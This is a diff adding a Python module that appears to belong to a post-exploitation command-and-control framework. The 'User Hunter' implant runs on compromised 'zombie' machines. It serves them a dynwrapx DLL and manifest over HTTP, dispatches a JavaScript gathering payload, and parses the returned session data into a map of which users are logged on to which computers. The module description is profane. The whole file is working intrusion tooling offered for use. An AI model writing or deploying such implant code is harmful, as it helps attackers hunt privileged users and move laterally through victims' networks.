@@ -1,0 +1,80 @@
+import core.implant
+import core.job
+import string
+
+class UserHunterJob(core.job.Job):
+    def create(self):
+        self.fork32Bit = True
+
+    def report(self, handler, data, sanitize = False):
+        data = data.decode('latin-1')
+        task = handler.get_header(self.options.get("UUIDHEADER"), False)
+
+        if task == self.options.get("DLLUUID"):
+            handler.send_file(self.options.get("DYNWRAPXDLL"))
+            return
+
+        if task == self.options.get("MANIFESTUUID"):
+            handler.send_file(self.options.get("DYNWRAPXMANIFEST"))
+            return
+
+        if len(data) == 0:
+            handler.reply(200)
+            return
+
+        if data == "Complete":
+            super(UserHunterJob, self).report(handler, data)
+        elif "***" in data:
+            self.parse_sessions_data(data)
+
+        # parse_sessions_data(data)
+        # self.print_good(data)
+
+        handler.reply(200)
+
+    def parse_sessions_data(self, data):
+        self.print_good("Session data retrieved")
+        sessions = data.split("***")
+        for session in sessions:
+            if session:
+                user = session.split(":")[0]
+                comps = ", ".join(list(set(session.split(":")[1].split(","))))
+                self.shell.print_plain(user + " => " + comps)
+
+    def done(self):
+        self.display()
+
+    def display(self):
+        try:
+            self.print_good(self.data)
+        except:
+            pass
+        #self.shell.print_plain(str(self.errno))
+
+class UserHunterImplant(core.implant.Implant):
+
+    NAME = "User Hunter"
+    DESCRIPTION = "Find a user, you fuck"
+    AUTHORS = ["TheNaterz"]
+
+    def load(self):
+        self.options.register("DIRECTORY", "%TEMP%", "writeable directory on zombie", required=False)
+
+        self.options.register("DYNWRAPXDLL", "data/bin/dynwrapx.dll", "relative path to dynwrapx.dll", required=True, advanced=True)
+        self.options.register("DYNWRAPXMANIFEST", "data/bin/dynwrapx.manifest", "relative path to dynwrapx.manifest", required=True, advanced=True)
+
+        self.options.register("UUIDHEADER", "ETag", "HTTP header for UUID", advanced=True)
+
+        self.options.register("DLLUUID", "", "HTTP header for UUID", hidden=True)
+        self.options.register("MANIFESTUUID", "", "UUID", hidden=True)
+
+    def run(self):
+
+        import uuid
+        self.options.set("DLLUUID", uuid.uuid4().hex)
+        self.options.set("MANIFESTUUID", uuid.uuid4().hex)
+
+        workloads = {}
+        workloads["js"] = self.loader.load_script("data/implant/gather/user_hunter.js", self.options)
+
+        self.dispatch(workloads, UserHunterJob)
